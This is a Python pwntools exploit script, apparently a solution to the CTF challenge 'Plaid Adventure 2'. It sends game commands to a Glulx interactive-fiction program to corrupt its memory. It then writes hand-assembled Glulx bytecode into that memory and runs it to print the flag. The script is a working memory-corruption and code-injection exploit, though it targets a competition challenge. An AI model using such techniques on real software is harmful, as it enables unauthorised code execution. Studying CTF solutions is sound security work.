#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)

def gen(data):
    result = []
    for i in range(len(data)/4):
        a = u32((data[i*4:i*4+4].ljust(4,"\x00"))[::-1])
        if a > 2**31:
            a = a - 2**32
        result.append(a)
    return result

if len(sys.argv) > 2:
    r = remote(HOST, PORT)
else:
    r = process(['./glulxe/glulxe', './Plaid_Adventure_2_36c2f32fe0c0866eeb250b7ac2f48310.ulx'])

sc_addr = 479074 + 28

r.sendlineafter('(Press any key to begin.)', '')

falvor = ['apple', 'apricot', 'blackberr', 'cherry',
          'cranberry', 'cola', 'grape', 'guava',
          'lemon', 'lime', 'orange', 'pickle', 'peach', 'pear',
          'pineapple', 'raspberry', 'strawberr', 'watermelo']

r.sendlineafter('>', 'select pickle')
r.sendlineafter('>', 'push button')

for _ in range(30):
    r.sendlineafter('>', 'drink pickle')

for i in range(5):
    r.sendlineafter('>', 'select {}'.format(i))
    r.sendlineafter('>', 'select {}'.format(falvor[i]))
    r.sendlineafter('>', 'push button')

r.sendlineafter('>', 'select {}'.format(sc_addr))
r.sendlineafter('>', 'select {}'.format(falvor[5]))
r.sendlineafter('>', 'push button')

# routine header
asm =  '\xc1\x00'
# @callfiii routine763 1 2 0 -> local4;
asm += '\x00\x81\x63\x13\x01\x09\x00\x00\x02\xfb\x01\x02\x04'
# @callfiii routine589 local4 2 301 -> mem450124;
asm += '\x81\x63\x93\x21\x0e'  + '\x00\x00\x02\x4d' + '\x04\x02\x01\x2d\x02\x4c'
# @restore mem450124 -> local0;
asm += '\x81\x24\x9e\x02\x4c'
# return 1
asm += '\x31'
# routine end
asm += '\x01\x01'

falvor.remove('pickle') # cannot use anymore
for i, s in enumerate(gen(asm)):
    r.sendlineafter('>', 'select {}'.format(s))
    r.sendlineafter('>', 'select {}'.format(falvor[6+i]))
    r.sendlineafter('>', 'push button')

r.sendlineafter('>', 'drink apple')

# remote input buffer is dirty ...
r.sendline('\b'*100 + 'flag' if len(sys.argv) > 2 else 'flag')

r.sendlineafter('>', 'look blackboard')

r.interactive()
